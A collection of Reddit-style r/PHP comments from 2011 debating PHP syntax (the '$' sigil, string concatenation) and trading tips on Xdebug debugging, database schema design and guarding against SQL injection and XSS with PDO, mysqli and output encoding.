Or BASIC, where the dollar sign is after the variable name instead.
I don't mind `=&gt;`. It's not a bad visual indicator of its function. `-&gt;` is way ugly, but I _can_ think of things in PHP syntax I'd fix first. Writing `array()` out, say, or `\` vs. `::`...
Lets change it to the € sign. 
Yeah I do of course. But for me seeing the $ is a lot quicker, I process that sub-consciously. Colours on the other hand, I would need to think of consciously and remember what colour meant what. Sure the colours alone make it fairly obvious, but the addition of $ makes it extremely obvious. When trying to decipher other people's code, the more obvious, the better. Just makes everything faster and less frustrating. I'm not saying there's a huge difference, but there is a difference. Maybe more for me than for other people?
I really don't see that as a value added feature. I'd rather not have my integers automatically reduced by half, thank you very much.
&gt; People who find it odd just happen to come from a different culture. Which, as always, means it has to go.
Unfortunately he used the term "stack trace", which pretty much exposes him as a troll.
&gt; I don't see how using + is confusing. String concatenation is literally adding two strings together, so why shouldn't + be used? Because PHP isn't strongly typed, so when you take the following: $var1 = '5'; $var2 = '3'; $var3 = $var1+$var2; How is PHP supposed to know if you want $var3 to be '53' or 8? In a strongly typed language (Ruby, Python, C, Java, etc..), it's obvious. Not so much in PHP.
It allows for quick identification of user-defined values. It separates user defined values from constants and constructs.
Netbeans has integrated IRC, E-mail, MSN, Reddit and Farmville. &gt;*Sent from my Netbeans 6.9*
There are other issues at hand, though, that make it a bad decision, IMO: 1. Restriction on class variable resolution (for example, in order, a Java variable resolves: local &lt; object &lt; static so qualifiers (this./ClassName. are usually unnecessary) and by requiring a $, the language developers have also implicitly forced writing of self:: or $this-&gt; (and let's not get started on the pile of wasted characters -&gt; is). I'm sure they could parse that anyway, but it would act unpredictably combined with php's "Access is a declaration" policy wrt to variables (which would have to change to use sigil-less variables). 2. Increases writing time. $ is a relatively hard key to press (although nowhere near as difficult as the -&gt; combination) because it requires significant movement off the home row for at least one hand. It's obviously nowhere near as easy as not writing anything at all :P 3. Is really bothersome some localized keyboards, especially in languages from different constructs, such as Russian or Arabic. This, of course, is easily solvable but every slight increase in difficulty is a corresponding increase in barrier-to-entry. 4. Allows variable variables. I have yet to see a single case where variable variables is a good solution, let alone the best solution, but people persist in using them anyway. Take them away and people can't abuse them! 5. The string interpolation sigil does not necessarily have to be part of regular variable access. Several templating (and other, but templating is the most common occurrence) languages allow ${} style, or some even just with a sigil. This isn't an argument to keep them. I can agree that having them makes a **slight** increase in readability with foreign code on a dumb or foreign editor, but the cons well outweigh the pros. 
There's no reason that using sigil or sigil-with-curly-brackets string interpolation has to be tied to using the same syntax for regular variables. There are other languages that allow string interpolation (Ruby, Velocity, etc.) and don't require it for regular variable accesses. It's not even hard to implement this with any particular lexer. String interpolation is a wonder syntactical sugar; it does not imply the sigil's necessity in regular variable access.
An IRC client, email client and instant messaging client make a ton of sense inside an IDE because they're usually things you're half paying attention while you're working - having them as a small side window in the IDE means you don't have to switch out of it (wasting time and losing focus) to use them.
&amp;#3232;\_&amp;#3232; 
Early april's fools joke :)
The binary minus operator is :-) : 4 + (-5) versus 4 - 5 Or even better, we can skip the +-operator: 4--5 versus 4+5 
Writing is kind of a pain in the arse, but I think it is good for readability. Furthermore I found that enforced slow-typing code as PHP does with $name, -&gt;, =&gt; decreases the number of typos and stupid coding errors.
Well, we could use the €-symbol for the in-operator: $ar = array( 1, 234, 45, 456,456,46,45, ½, 658, 65, 65, 658, 685, 0); if (45 € $ar) { // };
Spambot?
It can be a pain to set up the first time. But it's beyond worth it once you figure it out. You will also want a browser extension for Xdebug. On Chrome, the best is Xdebug Helper, and Firefox's version is "easy Xdebug" I think. It really does work best with Netbeans, so keep that in mind.
Cool story, bro... again.
I liked the part when he talked about Moneybookers
It can't be unseen: };
are you a republican? your weird "logic" really reminds me of arguments i've had with republicans. anyways. it would behave exact the same as the short_open_tag option.
Or just take a copy of the core file and its path from app/code/core/Mage/.... To app/code/local/Mage/..... and then make the functional changes you want in that file. 
 price = 10 taxes = .80 cost = "$" + price + taxes versus price = 10 taxes = 1 cost = "$" + price + taxes
Far better than other languages [[[what]the]fsck];
BC.
Will give it a try tomorrow.
I like the idea that if you're trying to do maths, put the code in ( )s. I do that in my JS code to make it clearer there's maths going on.
First PBS, now PHP? What are the republicans going to try to defund next?
STOP WITH THE DUPE POSTING
and when they complain tell them they're using it wrong
Holy fuck I couldn't imagine programming without all that stuff in the same window.
Besides enjoying the look it also makes using variables in classes pretty tasty. &lt;?php /* ... */ public function call($method='') { if(method_exists($this,$method)) return $this-&gt;$method(); } public function get($key='') { if(isset($this-&gt;$key)) return $this-&gt;$key; } /* ... */ ?&gt; Granted they could be replaced with something like this-&gt;{key} yet I for one enjoy my dollar dollar bills. (Perl was my first so I'm probably biased).
For loops always make me cry as I start to write them for (;;) { // }
I agree that your methodology is indeed a "best practice" but the OP makes a valid argument of making the __call method act as natively as possible. Because you and I use a best practice doesn't mean everyone does and everyone should expect the default php behaviour.
Hahaha, I like how you are so ridiculous I don't even have to be the one downvoting you. Instead of pointing out the "weird logic" you instead tried to make a personal attack. Actually, you have not even proposed any reason the idea stated would be positive even after I proposed a very good reason why the idea would have a negative impact. This has been fun, but really when you start insinuating I am a republican while making person attacks instead of actually discussing the topic at hand that is the end of it for me. Your short_open_tag idea doesn't even mention how that would be implemented or work in conjunction with variable variables when there is no access to the php.ini or init_set options, so I am going to just assume you picked a feature at random or are trolling me.
I do hate it about every other language that does it. It makes it unreliable to know whether it's going to attempt to add them as numbers or strings. They are totally different operations, they should have different operands.
No it doesn't make any sense, it is nothing like addition. 3 + 4 != 34. It's poor design.
Type juggling allows goofiness and laziness, it is definitely sloppy but I don't think it is necessarily by itself a problem. Things like using the same operand (+) for two completely different things is the bad design that causes problems.
&gt; the page could crash mid-load and bury the error message in some &gt; hidden html tag You can solve that by using [output buffering](http://www.php.net/manual/en/intro.outcontrol.php). Below is a simple example (normally you'd use OOP and templates). The important part is ob_clean() that erases all data currently waiting to be output. Then you compose the error page from scratch. &lt;?php ob_start(); set_error_handler('error'); function error($type, $message, $file, $line) { ob_clean(); echo '&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;'; echo 'An error of type '.$type. 'occurred in '.htmlspecialchars($file).':'.$line.': '.htmlspecialchars($message); echo '&lt;/body&gt;&lt;/html&gt;'; }
${$foo} == could just be ==&gt; {foo}
No, that's called PHP's really half-assed type system. In just about any sane language, one of two rules is in-play: A: Adding a string and a non-string is a type error, OR B: Adding a string and a non-string calls the non-strings toString or equivilant. Either of these is FAR FAR saner than trying to do math on strings.
How big is your screen!?
It should assume concatenation if they're both strings. That took me about two seconds of thought.
What is really sane is not using the same operand for two totally different operations. That's good design. Anything else is just stupid.
You should definitely file this as a feature request, I'm certain they will take it seriously.
They're not totally different operations. Concatenation is just adding two strings together.
So you think that floating point division should be changed to something besides / then, right? After all, integer and floating point division are different operations. 
"fairly new?!?"
I need to hit AltGr+4 (or Ctrl+Alt+4 when I'm right-hand-busy), you insensitive clod. But to ease the pain I have dedicated buttons for åäö.
 echo "&lt;pre&gt;".print_r($bar,true)."&lt;/pre&gt;"; Just thought it might come in handy to know that print_r will return the value if you pass true as a second parameter.
So you ar&amp;#101; saying {foo} would b&amp;#101; both foo, $foo, and $$foo. Y&amp;#101;ah, that won't caus&amp;#101; probl&amp;#101;ms.
Also, thanks for th&amp;#101; mold, but it took 2 s&amp;#101;conds to writ&amp;#101; a gr&amp;#101;as&amp;#101;monk&amp;#101;y fix to us&amp;#101; th&amp;#101; l&amp;#101;tt&amp;#101;r &amp;#101; again.
addition doesn't have to be algabraic addition. For instance.. adding two arrays togethor is another use of the +. It's archaic to think that these operators can/should only be used to do actual math. If that was their only purpose theyd just make functions like add() and crap like that.
ya? i was assuming the devs would enforce that on the backend. that's disappointing.
 foo =&gt; $foo {foo} =&gt; ${$foo} (or $$foo) it works. the other option is just you have to use $ for variable variables. ${foo} ==&gt; ${$foo}
...you ar&amp;#101; missing th&amp;#101; part wh&amp;#101;r&amp;#101; it br&amp;#101;aks &amp;#101;v&amp;#101;rything. If th&amp;#101; n&amp;#101;w format has foo working as $foo and I hav&amp;#101; pr&amp;#101;vious cod&amp;#101; using $$foo and $foo, th&amp;#101;n anything $foo would b&amp;#101; now int&amp;#101;rpr&amp;#101;t&amp;#101;d as $$foo und&amp;#101;r th&amp;#101; pr&amp;#101;s&amp;#101;nt&amp;#101;d option. If you d&amp;#101;cid&amp;#101;d to r&amp;#101;s&amp;#101;rv&amp;#101; variabl&amp;#101; variabl&amp;#101;s to $$foo only and hav&amp;#101; foo and $foo b&amp;#101; compil&amp;#101;d as $foo, you would br&amp;#101;ak a h&amp;#101;ll of a lot of t&amp;#101;mplating syst&amp;#101;ms. &gt;&amp;lt;html&amp;gt;&amp;lt;h&amp;#101;ad&amp;gt;&amp;lt;titl&amp;#101;&amp;gt;{titl&amp;#101;}&amp;lt;/titl&amp;#101;&amp;gt;&amp;lt;/h&amp;#101;ad&amp;gt;&amp;lt;/html&amp;gt;
you don't like the brackets? &gt;you would break a hell of a lot of templating systems. then those people can leave it turned off in their php.ini.but i'm pretty sure templating systems use regex anyways.
Brack&amp;#101;ts wast&amp;#101; mor&amp;#101; k&amp;#101;ystrok&amp;#101;s than th&amp;#101; dollar sign and only com&amp;#101; in handy during sp&amp;#101;cific occurr&amp;#101;nc&amp;#101;s. I think you miss&amp;#101;d my point so just r&amp;#101;ad som&amp;#101; oth&amp;#101;r comm&amp;#101;nts in this thr&amp;#101;ad and mayb&amp;#101; you will s&amp;#101;&amp;#101; it.
Incredibly useful and something I wish Opera (my main browser) had a long time ago. Thanks!
Just a note, this only works when you are viewing the entire source of the page, not just a portion, like when you select part of the site to view the source on.
Thanks for the clarification I hadn't tried that yet.
Yea, but take it logically. First write the code -&gt; then write the docs for it. How do you want them to make the docs for things that are not yet finished? Patience, you must have.
OOP functionality has been in PHP since the early 2000's and I have been using PHP for nearly ten years and it has been object oriented the entire time.
i *rarely* use variable variable. using it too often causes weak security in applications. so i don't mind the strokes. i saw your point, i just disagree and don't know how to prove that you are wrong. the syntax would work fine with no $variables.
Not sure what this has to do with PHP. Maybe more relevant to [/r/webdev](http://www.reddit.com/r/webdev).
And even better, it keeps the post data. That's why I haven't switched to Chrome yet for developing.
Write the docs for it -&gt; then release it How do you expect something without instructions to be useful? If most of it is documented thats fine. Keep in mind the context of my original post is "no documentation" which refers to oh so many projects that are just undocumented at the end of the day. Patience I have. The skill / will / ability to write my own documentation, not so much.
Not sure if serious or April fools joke... 
I keep Eclipse spread out over 2 23" 1080p screens. It'll be 4 if I ever man up and buy another video card.
Also works in Chrom3 (Canary Build)
I assume you ask because of Tumblr's big oops some days ago. However, the problem with Tumblr was that there apparently was no testing whatsoever - the moment some developer wrote "i?" instead of "&lt;?", the source of the PHP file was shown to the users. To catch that particular bug all they'd have to do was to load the edited page once in a browser. You wouldn't even require a real test, just a single page load. My point here is that this kind of error is easily caught, and it should be caught on the development server. TL;DR: Tumblr's problem was a lack of proper testing, so there's no reason to avoid having database credentials in a PHP file (as long as it's outside the doc root).
I wish I'd known that this morning.
I don't us&amp;#101; variabl&amp;#101; variabl&amp;#101;s so much as variabl&amp;#101; functions, but saying you don't know how to prov&amp;#101; I am wrong do&amp;#101;sn't mak&amp;#101; for a good point. I could say th&amp;#101; sam&amp;#101; thing to you without having any d&amp;#101;f&amp;#101;ns&amp;#101; to that stat&amp;#101;m&amp;#101;nt. Th&amp;#101; probl&amp;#101;m is it would br&amp;#101;ak backward compatibility plain and simpl&amp;#101; and caus&amp;#101; a lot of h&amp;#101;adach&amp;#101;. &amp;#101;v&amp;#101;n if just 2% of scripts ar&amp;#101; aff&amp;#101;ct&amp;#101;d, that is a lot of scripts. I am not sur&amp;#101; how you can possibly think it would b&amp;#101; a good id&amp;#101;a. It do&amp;#101;sn't h&amp;#101;lp with anything, it would br&amp;#101;ak backward compatibility, and would tak&amp;#101; tim&amp;#101; to impl&amp;#101;m&amp;#101;nt. 
Chrome supports this as well. One of my most favorite features.
[use PDO parameterised queries](http://www.php.net/manual/en/pdo.prepare.php)
Also, don't forget to sanitize inputs for XSS. Anyone care to post tips on preventing XSS?
I'm pretty sure you meant to link to another site. Fix your post (please). I'm actually excited there's a post about magento, even though I already know how to over-ride a controller.
If you copy the whole module, and set it to load from local instead of core in its modules/ file, that would work. Otherwise, the include path over-ride method doesn't work with controllers. You have to extend the class in another module. I prefer to copy the whole module to local.
I usually parametrize my inputs (prevent sql injection) with pdo, and sanitize my outputs using htmlentities (prevent XSS). And that covers the basics. 
I also attach to my debug process WinCacheGrind, so I can track the resources used.
You don't "prevent XSS", you filter HTML. Allowing unfiltered HTML has undesired effects beyond XSS, e.g. "&lt;" will not be visible and will be parsed like a tag. 
Though it might appear that this is a regular HTML injection attack, it's more likely an SQL injection. Here's a blog post that better explains what's going on: http://community.websense.com/blogs/securitylabs/archive/2011/03/31/update-on-lizamoon-mass-injection.aspx
I could go on and on. But I think me writing three full paragraphs was enough on this debugging topic alone, if not just a little bit too much. Christ, was I trying to write a book last night? But yeah, if you have output buffering going on in your website, it does make it easier to handle problems before they dump to output. But, each case is different, so any given website (or command line script/application) may or may not have output buffering going on. And, it is sometimes a pain when your framework automatically uses output buffering, which sometimes means you have to juggle the buffer stack.
Stop using frameworks.
I wish i had moré mold to givé you. 8=====D but i just léft work so thé jokés on you sucka ( . Y . )
Also, things like `echo "hello world";` can't work if you're trying to plant a variable named `world` in that string. Yes you could do `echo "hello {world}";`, but as the bug reporter said, keystrokes are just too valuable to waste.
You lazy mofo, switch to python man ;D...come to the dark side
I've found [PHP Console](https://chrome.google.com/extensions/detail/nfhmhhlpfleoednkpnnnkolmclajemef) ( in chrome ) together with [Lagger](http://code.google.com/p/lagger/) work well.
lol at: if($foo){ echo 'yay. $foo = ' . $foo; } else { echo 'WTF?!!?!?! Nooooooo.....'; } So very helpful though...if you don't want to go step by step with it...
Meta refresh is all fun and games, until someone gets redirected to a porn site on a company computer.
Not to sound like "the opposition" here but being a PHP developer myself and being in the same learning "stage" than peck3277 I think that learning Python or Ruby might not be the most interesting thing to do. I've tried Python myself and though I do acknowledge it's many fine features I think learning a programming language with a different paradigm might be more fun, or at least something which is not web oriented. I find myself learning C at the moment and although three weeks ago I thought it would be impossible to learn and that I would probably quit as soon as I had to compile my first hello_world.c I'm starting to see it's a really fun language, and it's oriented to a complete different kind of development.
Don't use the generic `mysql` library. Use parameterized statements and [`mysqli`](http://php.net/manual/en/book.mysqli.php) (especially the [`mysqli_stmt`](http://www.php.net/manual/en/class.mysqli-stmt.php) class) or [`pdo`](http://www.php.net/manual/en/book.pdo.php) instead. Avoid manually building query strings using variables as much as possible, _especially_ if those variables [touched any values supplied by the user or some external file or website](http://en.wikipedia.org/wiki/SQL_injection) (as I'd hope [apple's app store learned by now](http://support.apple.com/kb/HT1318)). The lesson of today: website scripting is not as easy as it's often portrayed.
If you get time to try a few, I'd recommend Komodo Edit as well. It's main feature for me is that it's not Java, but I've found it every bit as capable as Eclipse was.
Daunting... http://programmers.stackexchange.com/questions/46716/what-should-a-developer-know-before-building-a-public-web-site
As KarmaPinlata suggested, PDO does help prevent SQL injection attacks. However, if PDO is not an option - the alternative is the built-in function [mysql_real_escape_string](http://php.net/manual/en/function.mysql-real-escape-string.php). Regarding XSS, as dantenferno suggested, [htmlentities](http://us.php.net/manual/en/function.htmlentities.php) is extremely helpful. Other common attacks are remote file inclusion and external file access. PHPFreaks has a [decent article](http://www.phpfreaks.com/tutorial/php-security) covering them and the aforementioned SQL/XSS attacks.
You'ré both wrong. You prévént XSS by éncoding data during thé output phasé. &lt; géts transforméd to `&amp;lt;` Pléasé don't éncodé during input! You will want to filtér if you havé HTML that is manipulatéd by your usérs. You can réstrict thém to a sét of allowéd éléménts thén.
Can you detail how you do that? Sounds potentially useful.
Okay... it's "guard against XSS" in the context of this question. He wasn't asking about filtering tags.
Either way it works, but I'd rather have sanitized data hitting my db than storing it and sanitizing it for every output (not just site pages, but API services as well)
What other ways are there to build query strings?
Use log4j ported to log4php.
I normally use firebug and echo statements. Normally the things I have to debug is a forgotten semicolon. 
How do frameworks fare in terms of maintenance? Say 2, 3, 5 years down the track you want to make some updates to your site, can you easily drop in the latest framework version and it will still work? Or will major modifications be required?
Too many years of things working differently. People retrieve numerical values by parsing CSV files, etc., and expect to be able to use them as numbers without additional type coercion.
What about the minus symbol? $a = '3'; $b = 2; echo $a + $b; echo $a - $b; Under your regime, the output of the first would be '32' and the second would be '1'.
It's an absolutely inane suggestion which would break all existing code. Only a 7-year-old would have so little foresight.
I like this modification. Couldn't even figure out what the original was doing without spending a few minutes deciphering it.
i do this too. var_dumps, print_r and echo. i just want to know the easiest possiible way.
Update to prepared statements with mysql**i** or PDO. Protecting with mysql_real_escape_string is out of date these days.
A few months ago I spent a whole day trying to get it working but failed. Then today I just spent the whole afternoon trying to get xdebug working with the PHPstorm IDE. Even with instructions I was pulling my hair out in frustration. After not being able to get it to work I tried NetBeans and it worked straight away! Here are a few links which might save you some time if you haven't started: [#1](http://www.xdebug.org/find-binary.php) Basically you just paste in your phpinfo() output and it tells you how to install xdebug for your specific system. SO GOOD. [#2](http://xdebug.org/docs/remote) This is the main docs for xdebug but scroll down to Communication Set-up/Single Developer which shows the interaction. My config was stuffed for half the day because I was using localhost for the remote_host as some guides were saying. But my NetBeans client is on a different machine to my linux web server. Really I needed 192.168.1.50 (my machine) for the remote_host IP. [#3](http://netbeans.org/kb/docs/php/project-setup.html) Netbeans project setup page. Sets up your project etc. [#4](http://netbeans.org/kb/docs/php/debugging.html) Debugging with Netbeans step by step with nice pictures. Anyway I'm now able to step through my code line by line and set breakpoints etc. So good. It's like using Visual Studio with C#. Good luck!
I had been doing the same but [Netbeans + xdebug is so worth it if you can spare a few hours to set it up.](http://www.reddit.com/r/PHP/comments/gfznr/how_do_you_guys_debug_your_projects/c1nghlo)
&gt;The skill / will / ability to write my own documentation, not so much. Of course. I wouldn't do that either. No one would. But they will write the docs, at least that's what they say.
My ultimate goal is [six](http://www.offdutygamers.com/wp-content/uploads/swordfish02.jpg) :)
http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
Basically configure xdebug to create logs, and use [wincachegrind](http://sourceforge.net/projects/wincachegrind/) to [analyze them](http://drupal.org/node/549700).
 '/^SELECT\s(.+|\*)\sFROM\s(\w+)(?:\sWHERE\s((?:(?:\sand\s|\sor\s|\s&amp;&amp;\s|\s\|\|\s|\sxor\s)?\(?\w+(?:\s*(?:=|&lt;=|&gt;=|&lt;|&gt;|!=|&lt;&gt;)\s*(?:[0-9]+|\w+|\'[^\']*\')|\sLIKE\s\'[^\']*\'|\sBETWEEN\s[0-9]+\sAND\s[0-9]+|\s(?:IN|NOT IN)\s\((?:[^\)],?)+\))\)?)+))?(?:\sORDER BY\s((?:\w+(?:\sdesc|\sasc)?(?:,\s)?)+))?(?:\sLIMIT\s([0-9]+(?:,[0-9]+)?))?$/i'; *holy shit*
Why would you do that? You need different output encodings for different formats. HTML encoding is not going to make sense for when the data is used in Javascript. Do it your way if you want, but you'll make your life hell when you need the data encoded for different outputs. Not sure why I was downvoted either.
I'm certainly no pro but I think it's fair to say they're quite expandable and able to be updated. That's the beauty of them. Since they're a convention (some more strict than others), if you code properly, you can always update to the latest framework version to get new features, but not have to change any of your old code.
oh yeah, BIG shout-out to "The Regex Coach" ( http://weitz.de/regex-coach/ )!
Custom debug framework. Ex: Debug::log('Your vars:', $array($vars), DEBUG_LEVEL); You can build that out to show up in the view in DEV, and set your debug level higher in DEV to log more. Also, xdebug, firebug. 
wow, I hope you never do that.
They need more resources easily available on the site. WordPress may not be the most elegant code, but it has excellent documentation available. I'm interested, but not interested enough to figure out where the manual is.
Using [http_build_query](http://uk.php.net/http_build_query) with an array that you've sanitised 
Last time I saw this posted on reddit, I went over for a look. There was a notice about "oops, we lost the forums and all the posts, oh and our documentation too". I looked at the script a couple years ago, and it seemed OK for something lightweight, but I wouldn't call it full featured. Maybe it has matured since, but their site didn't fill me with confidence.
CopyPasta: Two tutorials that might help: [10 Things You Can Do to Become a Better PHP Developer](http://sixrevisions.com/web-development/10-things-you-can-do-to-become-a-better-php-developer) [Top 10 MySQL Mistakes Made By PHP Developers](http://blogs.sitepoint.com/mysql-mistakes-php-developers/) The headlines sound like they are for advanced developers. But they are not in my opinion.
Check out [RegExr](http://www.gskinner.com/RegExr/), great tool that you can use from anywhere :D
No, that makes sense! I guess it really depends on the context of the data you're encoding.
What is the code supposed to do? Not too knowledgeable about regexp.
Wait.. You *built* your own dbms?
Looks like a basic ORM. 
I wouldn't call it that. It's an attempt to use SQL on a very basic flat-file db.
I noticed. It's interesting, though, I doubt it would handle concurrent connections very well. It's a cool concept, though. 
That's one of the problems i ran into IIRC. I threw mkdir() at it and hoped for the best. But locking the whole table wasn't the best idea either.
Yeah, I noticed that, but I don't see how it would perform any better than flock. Ideally, you'd want this running as a separate service and with a work queue. 
I guess i worried about race-conditions and flock, i read somewhere (found it: O'Reillys PHP Cookbook) that this would be no problem with mkdir. I wrote this when shared-hosting services (the cheap ones) had no dbs, so running as service would not have been an option. This thing only ran on some guestbooks so i did not put too much effort in this concurrent-connections-thing and i'm not sure i even knew about it enough back then ;)
Frankly, I don't see how mkdir would change anything. It would still block access until it becomes available again and the page might time out before you're able to execute your query.
Except from an iPad.
Anywhere that doesn't suck*
Just in case they fix it: http://i.imgur.com/hFeZx.png Maybe they were hacked? Edit: stupidity
april fools?
but its april second
That kind of sums up Netbeans in general. Compared to the likes of Eclipse, Netbeans "just works".
SQLite is a file based database, and it can handle a TON of traffic
If PDO is not an option, then the mysqli_ family of methods is, in PHP. There's no reason to ever, ever write new code using the mysql family of functions and mysql_real_escape_string. mysqli_ supports prepared statements.
I don't see what that has to do with anything. We're talking about file locking here. 
maybe it's that damn strtotime bug again...
It's april fools. They don't have to operate on the same time zone as the rest of us :v
It was at least April 2nd in every timezone ಠ_ಠ April 3rd in some.
It's relevant in the sense that, unless the purpose was to learn, it didn't make much sense to build your own database when there were other options such as SQLite. SQLite was not enabled by default back then, but there were other options such as the document-based databases (can't remember their names).
First of all, I think the bloke can speak for himself. Second of all, I doubt that's what he was referring to. More likely that, considering we were talking about concurrent connections, race conditions and file locking, he was trying to say that because SQLite is a file-based database and it can handle a lot of traffic, this can too.. Which of course is fallacious thinking. While I appreciate what you say, I think it would be better to post these kind of remarks in a thread of its own so it does not derail the current conversation.
Yes, this and downloads.php went to the RoR DL page. However, the logo change was forgotten until after a few days. And lastly, the logo easter egg can be seen anytime, google it for details. 
OOP, done right (dependency injection/test driven development) - I would always recommend for a wide range of problems when building business applications. Frameworks, I would suggest that you need to pick the right framework; and doing so is an incredibly hard task. You want to look out for things like: * How tightly coupled is the code? * Is there heavy use of static methods? * Is there heavy use of the new keyword in the business logic of the framework (rather than in constructors)? * If you take an example unit test for the framework; could you write an instance of the class based on that test? * If you take a single component of a framework to solve a problem, do you have to require other components which don't make sense? This is where component libraries such as PEAR make more sense in my opinion - you pick the tool for the job. If it's old, crappy and broken often a replacement comes around (HTTP_Request vs HTTP_Request2 for instance) which allows you to make a small backwards compatibility change in a limited area of your code; rather than a vast sweeping one that an entire framework version bump leads to. Symfony 2 looks appealing; with its heavy focus on DI and the ability to use only one component, or many more as required - I think it's going to strike a good balance between framework/library. I would pick it over Zend Framework 1. As an example of why; take a look at Zend_Controller_Front. It implements a singleton, it pushes static methods such as run() for convience. It's forcing me to make only one instance of it ever - I could never write test coverage of anything which touches it in a meaningful way. (I know, there's less value in coverage of your controllers/wiring; and everything gets very fragile). Why should someone who is not building my application make that decision; and then completely prevent me from interfering? If run() is the 'easy' way; a lot of people are probably going to take it. Since it's static, if I want my test coverage or to extend the class, I have to go back and touch a lot of code. Another one - look at the source of [Zend_Controller_Action](http://www.tig12.net/downloads/apidocs/zf/Controller/Action.php.source.html) - the render() method. It's forcing me to either initiate a Zend_View via initView(); or extend the class to control how the Zend_View object is made. As you can see, instantiating a Zend_View properly is not a simple task - so I have to copy and paste then tweak it if I want to do something different. That's not OOP, it's incredibly fragile too - it's tight coupling forcing me to go down a certain path. I'm sure that since ZF was started, many of the mistakes have been realized - but for minor versions, no one is going to break the API. You have to wait for a ZF2 to come along; and it may make its own poor design choices. That represents a lot of re-engineering and testing you have to do; and often it's hard to justify that benefit to a business owner. What's the benefit of a new version of the framework? Same functionality? More maintainable? How many days of engineering? Didn't we go with the first version in the first place because we thought it would save us time / be maintainable; and now it isn't?
*cough* http://pear.php.net/package/SQL_parser/ */cough* Wheel re-invention :(
My only concern was having to handles write in the file at the same time. Performance was not my problem ;) I did this as a fun project, not serious in any sense. I liked playing with flat-files and regex.
Back when I was naive enough to hold domains and hosting at the same host, I moved my domains. 1&amp;1 held two of my domains hostage for several hundred dollars each on moving; I ended up letting them go rather than to pay the extortionate fees. Full disclosure: I own an ISP (this was long before I did,) though on reddit I have never said which one.
Yup, I completely understand that. However, you would have to block access to the file in order to have atomic writes. Doing so might create poor performance (up to the time that the script might time out) and even cause deadlocks. Point is, you have to be mindful about what it is you are doing and not take matters on faith. You know, Murphy's law and all that ;-) Anyway, it's an interesting project and I'm sure you had a lot fun writing it. 
I just checked my domains, and the four that I have with 1&amp;1 I'm comfortable parting with, so hopefully things will turn out as good as expected.
It must be because you're using loonix.
My only advice is sanitize your inputs.
Yeah, that would definitely help if I were going to use it for commercial use, but this is just for a school project I'm creating, so it doesn't have to be extremely secure yet. I just have to implement crucial functions specific to the site, like register, login, search, and rating. I have developed the first two (search is almost done), I'm just stuck wrapping my head around the rating system. Thank you though!
Ok, I'd structure the database a little differently. The following won't run, but you should be able to get my drift create table professors ( id integer(8) primary key auto_increment, firstname varchar(32), lastname varchar(32), department_id integer(4) ) create table departments ( id integer(4), name varchar(32) ) create table rating ( id integer(8), professor_id integer(8), overall integer (1), helpfulness integer (1), clarity integer (1), easiness integer(1) ) In the rating table, you'll want column to identify who created the rating, so they can't keep adding ratings. I suggest a login system, but you can always base it on ip I guess. Users will search for the professor by department or name and a list will come up that loops through the results. Pass the professor id to the page that lists the professor data and rateings. On the page that displays the data for the professor, you'll want to pull the average rating out for the professor. Select avg(overall), avg(helpfulness), avg(clarity), avg(easiness) from table rating WHERE professor_id = &lt;Variable that contains an integer value that you have either used an escape function on, or replaced any non integer values with something else&gt; 
Awesome suggestions! Thanks a ton, I knew my database was setup incorrectly, but didn't know exactly how to relate the tables to each other. Should the tables utilize foreign keys to link them together? Sorry if these questions seem elementary, I am new to both MySQL and PHP and this website is a daunting task for me.
Since you have only a small project with limited relations, I wouldn't use foreign keys. They have a some extra overhead that I prefer to avoid by putting in a little more coding effort. 
&gt;We are still investigating the details of the attack which combined a vulnerability in the Wiki software with a Linux root exploit. Anyone have any idea what the exploit was?
You betta HIDE YO INPUTS, HIDE YO OUTPUTS, because they be injectin' EVERYTHING up in HEEAH!!
-Steve Jobs
webGrind is what I use to debug my PHP stuff. 
About 6 weeks ago I was sitting in Maoz near NYU next to a couple of twerps who were breathlessly congratulating themselves on their ratemyprofessor clone which was going to turn the world upside down because, as I understood it, it was going to use more Javascript. So watch out, they're hot on your tail! As for your database, you probably want to normalize "department". I also don't think a single integer is going to be a very good representation of the rating, because it doesn't take into account how many people's votes have been averaged into it. Some guy who has one 5-star vote isn't nearly as impressive as someone with 1000 5-star votes. Using latin1 for the name fields will eventually get you into trouble as not every professor's name can be represented with that encoding. "Like" queries with % signs at the beginning are **really** slow. It won't matter if there are 10 rows in your database but if it gets large, that'll bring your server to its knees. And now, to the question itself. Let's say $trimmed is "Dave Nelson". Your query is: select * from professor where firstname like "%Dave Nelson%" or lastName like "%Dave Nelson%" See the problem? Neither first name nor last name is "Dave Nelson" or even contains that string. You have a few options: 1) Have separate search fields for "first name" and "last name" in your form. This is the easiest. 2) Try to guess what the first and last names are by looking for a space in the input. 3) Create a field that contains both the first and last names and search against that.
Premature optimization is evil! Small projects are exactly where you can afford to have higher overhead, as opposed to something like reddit with denormalization everywhere.
Hahaha that's funny. Thanks for all the advice! Now I see how unintelligent that search query is! I've been pouring a lot of hours into it, and it's creating so much stress I can barely think straight! To respond to your advice: What data type would best suit the average rating if int is a poor choice? Or are you suggesting multiple values, for example a "totalVotes" row that kept a total of all the votes and displayed that on the page along with the average? How would separating the search fields work? For example, here is the search form I created as per your advice: &lt;form action="search.php" method="post"&gt; &lt;input name="firstName" type="text" class="textfield" value="First Name"/&gt; &lt;input name="lastName" type="text" class="textfield" value="Last Name"/&gt; &lt;input type="submit" name="submit" value="Submit" /&gt; &lt;/form&gt; Now, here's PART of the search.php that would correspond to the above form (I edited it to the best of my knowledge but it's not working. It keeps outputting "Please enter a search"...) $var = @$_GET['firstName'] ; $var2 =@$_GET['lastName']; $trimmed = trim($var); $trimmed2 = trim($var2); if ($trimmed == "" and $trimmed2 == "") { echo "&lt;p&gt;Please enter a search...&lt;/p&gt;"; exit; } $query = "select * from professor where firstName like \"%$trimmed%\" or lastName like \"%$trimmed2%\" order by lastName"; As far as normalizing the tables, I took misplacedme's advice and made the following tables: professor http://i.imgur.com/YpHoW.png departments http://i.imgur.com/tA7Yr.png Now my next question would be, say I wanted to list a directory of professors on a page, and I wanted to include firstName, lastName, and department. How would I link the department_id from the professor table to the name in the department table, and then display them as a table in the "professor directory"? For example, with my previous database setup I used this php script: show_table("localhost","user","password","dbname","SELECT firstName, lastName, department FROM professor"); Sorry for all the questions, I really appreciate all the help you've given me already! tl;dr I really need help :P 
It may not be what you're looking for, but get in touch with a recruiter. They get a cut for finding work, but it's often worth it.
